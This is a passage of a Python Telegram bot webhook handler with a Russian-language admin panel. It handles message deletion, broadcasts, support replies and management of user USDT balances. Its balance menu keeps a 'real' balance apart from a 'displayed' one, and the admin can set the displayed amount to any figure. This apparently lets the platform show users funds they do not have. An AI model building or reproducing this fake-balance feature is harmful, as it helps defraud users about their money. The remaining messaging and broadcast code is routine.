                    await bot_send_message(chat_id, f"🎯 <b>Ограниченная рассылка</b>\n\n👥 Получателей: {count}\n\n🎯 Выберите канал доставки:", buttons, parse_mode="HTML")
                except Exception as e:
                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}")
                return {"ok": True}
            
            # Handle /delete_message command - Delete admin message from all users
            elif text.startswith("/delete_message ") and str(chat_id) == str(ADMIN_ID):
                try:
                    message_id = int(text.split()[1])
                    admin_msg = (await db.execute(select(AdminMessage).where(AdminMessage.id == message_id))).scalars().first()
                    
                    if admin_msg:
                        admin_msg.is_deleted = True
                        admin_msg.deleted_at = datetime.utcnow()
                        await db.commit()
                        await bot_send_message(chat_id, f"✅ Сообщение #{message_id} удалено у всех пользователей")
                    else:
                        await bot_send_message(chat_id, f"❌ Сообщение #{message_id} не найдено")
                except Exception as e:
                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}")
                return {"ok": True}
            
            # Check if admin is in balance management mode
            elif str(chat_id) == str(ADMIN_ID) and str(ADMIN_ID) in admin_balance_state:
                if text == "/cancel":
                    del admin_balance_state[str(ADMIN_ID)]
                    await bot_send_message(chat_id, "❌ Отменено", [[{"text": "🔙 Главное меню", "callback_data": "admin:menu"}]])
                    return {"ok": True}
                
                state = admin_balance_state[str(ADMIN_ID)]
                action = state.get("action")
                
                # Handle profile ID input
                if action == "select_user":
                    try:
                        profile_id = int(text)
                        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
                        if user:
                            # Show user menu
                            real_bal = user.balance_usdt or 0.0
                            display_bal = user.display_balance_usdt if user.display_balance_usdt is not None else real_bal
                            user_info = format_user_info(user)
                            response_text = f"👤 <b>Пользователь: {user_info}</b>\n"
                            response_text += f"💰 Реальный баланс: {real_bal:.2f} USDT\n"
                            response_text += f"🎭 Отображаемый: {display_bal:.2f} USDT\n\n"
                            response_text += "Выберите действие:"
                            
                            buttons = [
                                [{"text": "➕ Пополнить", "callback_data": f"admin:balance:add:{profile_id}"}],
                                [{"text": "➖ Списать", "callback_data": f"admin:balance:subtract:{profile_id}"}],
                                [{"text": "✏️ Установить точную сумму", "callback_data": f"admin:balance:set:{profile_id}"}],
                                [{"text": "🎭 Изменить отображаемый", "callback_data": f"admin:balance:display:{profile_id}"}],
                                [{"text": "🔙 Назад", "callback_data": "admin:balance"}]
                            ]
                            admin_balance_state[str(ADMIN_ID)] = {"action": "select_action", "profile_id": profile_id}
                            await bot_send_message(chat_id, response_text, buttons, parse_mode="HTML")
                        else:
                            await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден\n\nПопробуйте другой ID:", parse_mode="HTML")
                    except ValueError:
                        await bot_send_message(chat_id, "❌ Введите корректный Profile ID (число):", parse_mode="HTML")
                    return {"ok": True}
                
                # Handle amount inputs
                profile_id = state.get("profile_id")
                if profile_id:
                    try:
                        amount = float(text)
                        
                        if action == "input_add_amount":
                            result = await execute_balance_change(db, profile_id, amount, "add", chat_id)
                            if result["ok"]:
                                buttons = [[{"text": "💰 Другая операция", "callback_data": f"admin:balance:user:{profile_id}"}],
                                          [{"text": "🔙 Главное меню", "callback_data": "admin:menu"}]]
                                await bot_send_message(chat_id, result["message"], buttons, parse_mode="HTML")
                                del admin_balance_state[str(ADMIN_ID)]
                            else:
                                await bot_send_message(chat_id, result["message"], parse_mode="HTML")
                        
                        elif action == "input_sub_amount":
                            result = await execute_balance_change(db, profile_id, -amount, "add", chat_id)
                            if result["ok"]:
                                buttons = [[{"text": "💰 Другая операция", "callback_data": f"admin:balance:user:{profile_id}"}],
                                          [{"text": "🔙 Главное меню", "callback_data": "admin:menu"}]]
                                await bot_send_message(chat_id, result["message"], buttons, parse_mode="HTML")
                                del admin_balance_state[str(ADMIN_ID)]
                            else:
                                await bot_send_message(chat_id, result["message"], parse_mode="HTML")
                        
                        elif action == "input_set_amount":
                            result = await execute_balance_change(db, profile_id, amount, "set", chat_id)
                            if result["ok"]:
                                buttons = [[{"text": "💰 Другая операция", "callback_data": f"admin:balance:user:{profile_id}"}],
                                          [{"text": "🔙 Главное меню", "callback_data": "admin:menu"}]]
                                await bot_send_message(chat_id, result["message"], buttons, parse_mode="HTML")
                                del admin_balance_state[str(ADMIN_ID)]
                            else:
                                await bot_send_message(chat_id, result["message"], parse_mode="HTML")
                        
                        elif action == "input_display_amount":
                            user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
                            if user:
                                user.display_balance_usdt = amount
                                await db.commit()
                                message = f"✅ <b>Отображаемый баланс обновлен!</b>\n\n"
                                message += f"🆔 Profile ID: #{profile_id}\n"
                                message += f"🎭 Новый отображаемый: {amount:.2f} USDT\n"
                                message += f"💎 Реальный баланс: {user.balance_usdt:.2f} USDT"
                                
                                buttons = [[{"text": "💰 Другая операция", "callback_data": f"admin:balance:user:{profile_id}"}],
                                          [{"text": "🔙 Главное меню", "callback_data": "admin:menu"}]]
                                await bot_send_message(chat_id, message, buttons, parse_mode="HTML")
                                del admin_balance_state[str(ADMIN_ID)]
                            else:
                                await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден", parse_mode="HTML")
                    
                    except ValueError:
                        await bot_send_message(chat_id, "❌ Введите корректную сумму (число):\n\nПример: 100.50", parse_mode="HTML")
                    return {"ok": True}
                
                return {"ok": True}
            
            # Check if admin is in broadcast mode
            elif str(chat_id) == str(ADMIN_ID) and str(ADMIN_ID) in admin_broadcast_state:
                if text == "/cancel":
                    del admin_broadcast_state[str(ADMIN_ID)]
                    await bot_send_message(chat_id, "❌ Отменено")
                    return {"ok": True}
                
                broadcast_info = admin_broadcast_state[str(ADMIN_ID)]
                message_text = text
                
                try:
                    if broadcast_info["type"] == "user":
                        # Send to specific user
                        user_identifier = broadcast_info["target"]
                        user = None
                        
                        if str(user_identifier).isdigit():
                            user = (await db.execute(select(User).where(User.profile_id == int(user_identifier)))).scalars().first()
                            if not user:
                                user = (await db.execute(select(User).where(User.telegram_id == str(user_identifier)))).scalars().first()
                        
                        if user:
                            admin_msg = AdminMessage(user_id=user.id, message_text=message_text, is_broadcast=False)
                            db.add(admin_msg)
                            await db.commit()
                            
                            try:
                                await bot_send_message(int(user.telegram_id), f"📨 <b>Сообщение от администратора:</b>\n\n{message_text}", parse_mode="HTML")
                                user_display = format_user_display(user)
                                await bot_send_message(chat_id, f"✅ Сообщение отправлено пользователю {user_display}")
                            except Exception as e:
                                await bot_send_message(chat_id, f"❌ Ошибка отправки: {str(e)}")
                        else:
                            await bot_send_message(chat_id, f"❌ Пользователь не найден")
                    
                    elif broadcast_info["type"] == "all":
                        # Broadcast to all users
                        users = (await db.execute(select(User))).scalars().all()
                        sent_count = 0
                        delivery_type = broadcast_info.get("delivery", "app_chat")
                        
                        # Save to DB only if delivery is app_chat
                        if delivery_type == "app_chat":
                            admin_msg = AdminMessage(user_id=None, message_text=message_text, is_broadcast=True, broadcast_count=0, delivery_type=delivery_type)
                            db.add(admin_msg)
                            await db.flush()
                        
                        # Send to each user via Telegram
                        for user in users:
                            try:
                                await bot_send_message(int(user.telegram_id), f"📨 <b>Важное сообщение:</b>\n\n{message_text}", parse_mode="HTML")
                                sent_count += 1
                            except:
                                pass
                        
                        if delivery_type == "app_chat":
                            admin_msg.broadcast_count = sent_count
                        
                        await db.commit()
                        delivery_label = "в приложении" if delivery_type == "app_chat" else "в Telegram"
                        await bot_send_message(chat_id, f"✅ <b>Рассылка завершена!</b>\n\n📤 Отправлено: {sent_count}/{len(users)}\n📱 Канал: {delivery_label}", parse_mode="HTML")
                    
                    elif broadcast_info["type"] == "limited":
                        # Broadcast to limited users
                        count = broadcast_info["target"]
                        delivery_type = broadcast_info.get("delivery", "app_chat")
                        users = (await db.execute(select(User).order_by(User.created_at.desc()).limit(count))).scalars().all()
                        sent_count = 0
                        
                        # Process each user
                        for user in users:
                            # Save to DB only if delivery is app_chat (create personal message)
                            if delivery_type == "app_chat":
                                admin_msg = AdminMessage(user_id=user.id, message_text=message_text, is_broadcast=False, delivery_type=delivery_type)
                                db.add(admin_msg)
                            
                            # Send via Telegram
                            try:
                                await bot_send_message(int(user.telegram_id), f"📨 <b>Важное сообщение:</b>\n\n{message_text}", parse_mode="HTML")
                                sent_count += 1
                            except:
                                pass
                        
                        await db.commit()
                        delivery_label = "в приложении" if delivery_type == "app_chat" else "в Telegram"
                        await bot_send_message(chat_id, f"✅ <b>Рассылка завершена!</b>\n\n📤 Отправлено: {sent_count}/{len(users)}\n📱 Канал: {delivery_label}", parse_mode="HTML")
                    
                    del admin_broadcast_state[str(ADMIN_ID)]
                except Exception as e:
                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}")
                    if str(ADMIN_ID) in admin_broadcast_state:
                        del admin_broadcast_state[str(ADMIN_ID)]
                
                return {"ok": True}
            
            # Check if this is admin replying to a user
            elif str(chat_id) == str(ADMIN_ID) and str(ADMIN_ID) in admin_reply_state:
                if text == "/cancel":
                    del admin_reply_state[str(ADMIN_ID)]
                    await bot_send_message(chat_id, "❌ Режим ответа отменен")
                else:
                    target_user_id = admin_reply_state[str(ADMIN_ID)]
                    # Find user by telegram_id
                    user = (await db.execute(select(User).where(User.telegram_id == target_user_id))).scalars().first()
                    if user:
                        # Save admin message to database
                        admin_msg = SupportMessage(user_id=user.id, sender="admin", text=text, file_path=None)
                        db.add(admin_msg)
                        await db.commit()
                        
                        # Send notification to user via Telegram with button to open app
                        try:
                            notification_text = (
                                "💬 <b>Новое сообщение от администрации!</b>\n\n"
                                "📱 Зайдите в чат поддержки в приложении, чтобы прочитать сообщение."
                            )
                            # Button to open Mini App
                            open_app_button = [[{
                                "text": "📱 Открыть чат поддержки",
                                "web_app": {"url": HOST_BASE}
                            }]]
                            await bot_send_message(int(target_user_id), notification_text, open_app_button, parse_mode="HTML")
                        except: pass
                        
                        # Confirm to admin
                        await bot_send_message(chat_id, f"✅ Сообщение отправлено пользователю {target_user_id}")
                        del admin_reply_state[str(ADMIN_ID)]
                    else:
                        await bot_send_message(chat_id, "❌ Пользователь не найден")
                        del admin_reply_state[str(ADMIN_ID)]
    except Exception as e:
        print(f"Webhook error: {e}")
    return {"ok":True}
app.include_router(router)